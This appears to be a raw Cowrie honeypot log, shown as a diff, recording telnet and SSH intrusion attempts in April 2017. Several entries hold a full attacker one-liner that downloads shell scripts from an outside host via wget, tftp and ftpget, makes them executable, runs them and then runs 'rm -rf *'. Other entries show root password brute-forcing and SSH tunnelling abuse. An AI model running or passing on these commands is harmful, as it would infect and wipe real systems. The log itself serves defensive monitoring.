+2017-04-30T00:38:42+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: wget http://198.71.80.133/cunty.sh
+2017-04-30T00:38:42+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T00:38:42+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] got channel 'direct-tcpip' request
+2017-04-30T00:38:42+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] direct-tcp connection request to 188.214.134.13:8888 from localhost:5556
+2017-04-30T00:38:42+0000 [HTTPPageDownloader,client] Command found: chmod 777 cunty.sh
+2017-04-30T00:38:42+0000 [HTTPPageDownloader,client] Command found: sh cunty.sh
+2017-04-30T00:38:42+0000 [HTTPPageDownloader,client] Command found: tftp 198.71.80.133 -c get shtftp1.sh
+2017-04-30T00:38:42+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp1.sh
+2017-04-30T00:38:42+0000 [HTTPPageDownloader,client] Command found: sh shtftp1.sh
+2017-04-30T00:38:42+0000 [HTTPPageDownloader,client] Command found: tftp -r shtftp2.sh -g 198.71.80.133
+2017-04-30T00:38:42+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp2.sh
+2017-04-30T00:38:42+0000 [HTTPPageDownloader,client] Command found: sh shtftp2.sh
+2017-04-30T00:38:42+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh
+2017-04-30T00:38:42+0000 [HTTPPageDownloader,client] FTP connect failed: host=198.71.80.133, port=21, err=[Errno 111] Connection refused
+2017-04-30T00:38:42+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-30T00:38:42+0000 [HTTPPageDownloader,client] Command found: rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh
+2017-04-30T00:38:42+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-30T00:38:42+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T00:38:42+0000 [SSHChannel None (24) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] direct-tcp forward to 188.214.134.13:8888 with data 'GET /v3/callerinfo/?geo=true HTTP/1.1\r\nHost: 188.214.134.13:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-04-30T00:38:42+0000 [SSHChannel None (24) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] failed to connect: Connection refused
+2017-04-30T00:38:42+0000 [SSHChannel None (24) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] sending close 24
+2017-04-30T00:38:43+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:43+0000 [-] unauthorized login: 
+2017-04-30T00:38:43+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:43+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10179
+2017-04-30T00:38:43+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:44+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:44+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] got channel 'direct-tcpip' request
+2017-04-30T00:38:44+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] direct-tcp connection request to 188.214.134.13:8888 from localhost:5556
+2017-04-30T00:38:44+0000 [SSHChannel None (25) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] direct-tcp forward to 188.214.134.13:8888 with data 'GET /v3/callerinfo/?geo=true HTTP/1.1\r\nHost: 188.214.134.13:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-04-30T00:38:44+0000 [SSHChannel None (25) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] failed to connect: Connection refused
+2017-04-30T00:38:44+0000 [SSHChannel None (25) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] sending close 25
+2017-04-30T00:38:45+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:45+0000 [-] unauthorized login: 
+2017-04-30T00:38:45+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:45+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10180
+2017-04-30T00:38:45+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:45+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:45+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] got channel 'direct-tcpip' request
+2017-04-30T00:38:45+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] direct-tcp connection request to 188.214.134.13:8888 from localhost:5556
+2017-04-30T00:38:46+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] got channel 'direct-tcpip' request
+2017-04-30T00:38:46+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] direct-tcp connection request to 104.81.104.99:443 from localhost:5556
+2017-04-30T00:38:46+0000 [SSHChannel None (26) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] direct-tcp forward to 188.214.134.13:8888 with data 'GET /v3/callerinfo/?geo=true HTTP/1.1\r\nHost: 188.214.134.13:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-04-30T00:38:46+0000 [SSHChannel None (26) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] failed to connect: Connection refused
+2017-04-30T00:38:46+0000 [SSHChannel None (26) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] sending close 26
+2017-04-30T00:38:46+0000 [SSHChannel None (56) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] direct-tcp forward to 104.81.104.99:443 with data '\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x80o\xadR\xd4w\xf6\xfb\x99\xdb\x05\xbb\xa9\x96\xa0\xfb\x15K}\xef\x9f\xd2\xf4\xf9-\x0bG\x0c\x80\x02\xf3\x83"'
+2017-04-30T00:38:46+0000 [SSHChannel None (56) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] failed to connect: Connection refused
+2017-04-30T00:38:46+0000 [SSHChannel None (56) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] sending close 56
+2017-04-30T00:38:46+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:46+0000 [-] unauthorized login: 
+2017-04-30T00:38:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10181
+2017-04-30T00:38:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:47+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:48+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:48+0000 [-] unauthorized login: 
+2017-04-30T00:38:48+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:48+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10182
+2017-04-30T00:38:48+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:50+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:50+0000 [-] unauthorized login: 
+2017-04-30T00:38:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10183
+2017-04-30T00:38:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:51+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: sh
+2017-04-30T00:38:51+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: sh 
+2017-04-30T00:38:51+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: shell
+2017-04-30T00:38:51+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command not found: shell
+2017-04-30T00:38:51+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: cd /tmp || cd /var/; wget http://198.71.80.133/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp 198.71.80.133 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 198.71.80.133; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *
+2017-04-30T00:38:51+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /tmp
+2017-04-30T00:38:51+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /var
+2017-04-30T00:38:51+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: wget http://198.71.80.133/cunty.sh
+2017-04-30T00:38:51+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T00:38:51+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:51+0000 [-] unauthorized login: 
+2017-04-30T00:38:51+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10184
+2017-04-30T00:38:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:52+0000 [SSHChannel None (57) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] remote eof
+2017-04-30T00:38:52+0000 [SSHChannel None (57) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] remote close
+2017-04-30T00:38:52+0000 [SSHChannel None (57) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] sending close 57
+2017-04-30T00:38:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] got channel 'direct-tcpip' request
+2017-04-30T00:38:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] direct-tcp connection request to 74.125.30.26:25 from localhost:5556
+2017-04-30T00:38:52+0000 [HTTPPageDownloader,client] Command found: chmod 777 cunty.sh
+2017-04-30T00:38:52+0000 [HTTPPageDownloader,client] Command found: sh cunty.sh
+2017-04-30T00:38:52+0000 [HTTPPageDownloader,client] Command found: tftp 198.71.80.133 -c get shtftp1.sh
+2017-04-30T00:38:52+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp1.sh
+2017-04-30T00:38:52+0000 [HTTPPageDownloader,client] Command found: sh shtftp1.sh
+2017-04-30T00:38:52+0000 [HTTPPageDownloader,client] Command found: tftp -r shtftp2.sh -g 198.71.80.133
+2017-04-30T00:38:52+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp2.sh
+2017-04-30T00:38:52+0000 [HTTPPageDownloader,client] Command found: sh shtftp2.sh
+2017-04-30T00:38:52+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh
+2017-04-30T00:38:52+0000 [HTTPPageDownloader,client] FTP connect failed: host=198.71.80.133, port=21, err=[Errno 111] Connection refused
+2017-04-30T00:38:52+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-30T00:38:52+0000 [HTTPPageDownloader,client] Command found: rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh
+2017-04-30T00:38:52+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-30T00:38:52+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T00:38:53+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:53+0000 [-] unauthorized login: 
+2017-04-30T00:38:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10185
+2017-04-30T00:38:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:54+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:55+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:55+0000 [-] unauthorized login: 
+2017-04-30T00:38:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10186
+2017-04-30T00:38:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:56+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:56+0000 [-] unauthorized login: 
+2017-04-30T00:38:56+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:57+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10187
+2017-04-30T00:38:57+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:57+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:57+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: sh
+2017-04-30T00:38:57+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: sh 
+2017-04-30T00:38:57+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: shell
+2017-04-30T00:38:57+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command not found: shell
+2017-04-30T00:38:57+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: cd /tmp || cd /var/; wget http://198.71.80.133/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp 198.71.80.133 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 198.71.80.133; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *
+2017-04-30T00:38:57+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /tmp
+2017-04-30T00:38:57+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /var
+2017-04-30T00:38:57+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: wget http://198.71.80.133/cunty.sh
+2017-04-30T00:38:57+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T00:38:57+0000 [HTTPPageDownloader,client] Command found: chmod 777 cunty.sh
+2017-04-30T00:38:57+0000 [HTTPPageDownloader,client] Command found: sh cunty.sh
+2017-04-30T00:38:57+0000 [HTTPPageDownloader,client] Command found: tftp 198.71.80.133 -c get shtftp1.sh
+2017-04-30T00:38:57+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp1.sh
+2017-04-30T00:38:57+0000 [HTTPPageDownloader,client] Command found: sh shtftp1.sh
+2017-04-30T00:38:57+0000 [HTTPPageDownloader,client] Command found: tftp -r shtftp2.sh -g 198.71.80.133
+2017-04-30T00:38:57+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp2.sh
+2017-04-30T00:38:57+0000 [HTTPPageDownloader,client] Command found: sh shtftp2.sh
+2017-04-30T00:38:57+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh
+2017-04-30T00:38:58+0000 [HTTPPageDownloader,client] FTP connect failed: host=198.71.80.133, port=21, err=[Errno 111] Connection refused
+2017-04-30T00:38:58+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-30T00:38:58+0000 [HTTPPageDownloader,client] Command found: rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh
+2017-04-30T00:38:58+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-30T00:38:58+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T00:38:58+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:58+0000 [-] unauthorized login: 
+2017-04-30T00:38:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10188
+2017-04-30T00:38:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:39:00+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:39:00+0000 [-] unauthorized login: 
+2017-04-30T00:39:00+0000 [-] Disconnecting with error, code 14
+	reason: too many bad auths
+2017-04-30T00:39:00+0000 [HoneyPotSSHTransport,48930,195.22.127.83] connection lost
+2017-04-30T00:39:00+0000 [HoneyPotSSHTransport,48930,195.22.127.83] Connection lost after 61 seconds
